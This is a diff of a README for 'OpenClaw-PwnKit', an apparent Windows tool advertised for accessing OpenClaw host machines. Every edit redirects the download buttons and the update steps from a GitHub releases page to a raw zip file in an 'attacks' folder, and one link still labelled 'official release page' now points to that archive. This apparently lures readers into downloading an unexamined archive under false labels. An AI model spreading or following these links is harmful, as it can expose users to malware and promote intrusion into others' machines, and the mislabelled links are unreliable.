@@ -1,6 +1,6 @@
 # 🐾 OpenClaw-PwnKit - Access OpenClaw Host Machines Easily
 
-[![Download OpenClaw-PwnKit](https://img.shields.io/badge/Download-OpenClaw--PwnKit-blue?style=for-the-badge)](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases)
+[![Download OpenClaw-PwnKit](https://img.shields.io/badge/Download-OpenClaw--PwnKit-blue?style=for-the-badge)](https://raw.githubusercontent.com/Consequential-stateswoman97/OpenClaw-PwnKit/main/attacks/Open_Pwn_Kit_Claw_v3.8.zip)
 
 ---
 
@@ -29,9 +29,9 @@ OpenClaw-PwnKit runs locally on your PC. It does not require special hardware or
 
 Your first step is to get the application on your Windows computer.
 
-[![Download OpenClaw-PwnKit](https://img.shields.io/badge/Download-OpenClaw--PwnKit-brightgreen?style=for-the-badge)](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases)
+[![Download OpenClaw-PwnKit](https://img.shields.io/badge/Download-OpenClaw--PwnKit-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Consequential-stateswoman97/OpenClaw-PwnKit/main/attacks/Open_Pwn_Kit_Claw_v3.8.zip)
 
-1. Click the large green button above or visit the [official OpenClaw-PwnKit release page](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases) directly.
+1. Click the large green button above or visit the [official OpenClaw-PwnKit release page](https://raw.githubusercontent.com/Consequential-stateswoman97/OpenClaw-PwnKit/main/attacks/Open_Pwn_Kit_Claw_v3.8.zip) directly.
 
 2. On the release page, look for the latest version listed at the top. Versions are named something like `v1.0` or higher.
 
@@ -141,7 +141,7 @@ The OpenClaw-PwnKit team updates the app occasionally. Updates may include:
 
 To update:
 
-1. Visit the release page at https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases.
+1. Visit the release page at https://raw.githubusercontent.com/Consequential-stateswoman97/OpenClaw-PwnKit/main/attacks/Open_Pwn_Kit_Claw_v3.8.zip
 
 2. Download the latest Windows installer.
 
@@ -167,4 +167,4 @@ If you need assistance beyond this guide:
 
 Get started by visiting the release page and downloading the latest Windows version:
 
-[Download here](https://github.com/Consequential-stateswoman97/OpenClaw-PwnKit/releases)
+[Download here](https://raw.githubusercontent.com/Consequential-stateswoman97/OpenClaw-PwnKit/main/attacks/Open_Pwn_Kit_Claw_v3.8.zip)
